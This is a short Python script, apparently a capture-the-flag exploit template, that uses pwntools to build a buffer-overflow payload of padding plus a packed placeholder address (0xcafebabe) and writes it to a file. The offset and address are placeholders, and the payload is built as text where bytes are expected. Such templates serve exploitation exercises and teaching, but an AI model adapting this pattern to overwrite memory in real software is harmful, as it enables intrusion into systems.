#!/usr/bin/env python

from pwn import *

offset = 0
address = p64(0xcafebabe)

# 'x' is 0x78
payload = 'x' * offset + address

with open("payload", "wb") as output_file:
    output_file.write(payload)
